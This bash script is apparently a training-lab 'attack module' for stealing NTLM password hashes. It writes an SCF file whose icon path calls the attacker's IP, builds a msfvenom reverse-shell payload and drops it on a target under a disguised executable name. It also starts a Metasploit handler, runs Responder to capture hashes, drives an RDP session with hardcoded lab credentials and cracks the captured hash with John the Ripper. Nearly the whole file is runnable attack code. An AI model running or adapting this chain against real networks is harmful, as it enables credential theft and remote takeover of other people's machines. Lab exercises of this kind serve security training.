#!/bin/bash

# Author: Justin Shultz
# ID: m8rZr5w8rON0ii9RiwOdQyzmNtB3
# Lab: Use Responder And A SCF File To Steal NTLM Password Hashes

# Description: Use Responder.py and a SCF file to steal the NTLM hashes of any user that browses a file share.

echo "###########################################################################"
echo " ATTACK MODULE: Use Responder And A SCF File To Steal NTLM Password Hashes "
echo "###########################################################################"
sleep 5

echo "[+] Loading variables from env_vars.bash..."
source env_vars.bash
sleep 2

echo "[+] Loading functions from functions.bash..."
source functions.bash
sleep 2

# Create the SCF file
echo "[+] Creating the SCF file..."
echo "[Shell]
Command=2
IconFile=//${AttackerIP}/share/icon.ico
[Taskbar]
Command=ToggleDesktop" > ${SCFName}
sleep 2

# Initial access setup
echo "[+] Setting up initial access..."
msfvenom -p $MSFPayload LHOST=$AttackerIP LPORT=$InitialAccessPort -f exe -o $PayloadName
confirm_salt_connectivity $TargetSaltName
copy_file_to_target $PayloadName $TargetSaltName 'C:\Users\young.zaffina\Downloads\gpdmonitor.exe'

# Run the payload on the target machine
AttackerIP="$AttackerIP" MSFPayload="$MSFPayload" PayloadName="$PayloadName" InitialAccessPort="$InitialAccessPort" TargetSaltName="$TargetSaltName" SCFName="$SCFName" msfconsole -q -r attack_data/multi_handler.rc

echo "[+] Running Responder..."
tmux new-session -d -s attack -n "Responder" "sudo responder -I $Interface -w -d" 2>/dev/null || tmux new-window -n "Responder" "sudo responder -I $Interface -w -d"
sleep 5

echo "[+] Simulating user browsing the file share..."
xfreerdp /u:Young.Zaffina /p:P@55w0rd! /v:172.16.0.102 /sec:nla /cert-ignore /f > /dev/null 2>&1 &
sleep 10
cr_checkprocess hn-wks-01 OneDrive 10
rdpId=$(xdotool search --name "FreeRDP: 172.16.0.102")
xdotool windowactivate --window ${rdpId}
sleep 2
xdotool key --window ${rdpId} Ctrl+Escape
sleep 3
xdotool type --window ${rdpId} "\\\\hn-files\\shares"
sleep 3
xdotool key --window ${rdpId} Return
sleep 7
killall xfreerdp
sleep 2

ls -la /usr/share/responder/logs
sleep 2
if [ -f /usr/share/responder/logs/SMB-NTLMv2-SSP-130.2.2.2.txt ]; then
    echo "[+] NTLM hash stolen!"
    cat /usr/share/responder/logs/SMB-NTLMv2-SSP-130.2.2.2.txt
else
    echo "[!] NTLM hash not stolen!"
    exit 1
fi
sleep 2

echo "P@55w0rd!" | sudo tee -a /usr/share/john/password.lst > /dev/null 2>&1

echo "[+] Cracking the NTLM hash with John the Ripper..."
john /usr/share/responder/logs/SMB-NTLMv2-SSP-130.2.2.2.txt
sleep 2

# Display pretty output username and password (not hardcoded)
echo "[+] Displaying the cracked password..."
echo "┌─────────────────────────────────────┐"
printf  "│  %-8s  →  %-22s│\n" "Username" "${TargetUsername}"
echo "└─────────────────────────────────────┘"
printf  "│  %-8s  →  %-22s│\n" "Password" "$(john --show /usr/share/responder/logs/SMB-NTLMv2-SSP-130.2.2.2.txt | head -n 1 | cut -d: -f2)"
echo "└─────────────────────────────────────┘"
sleep 2
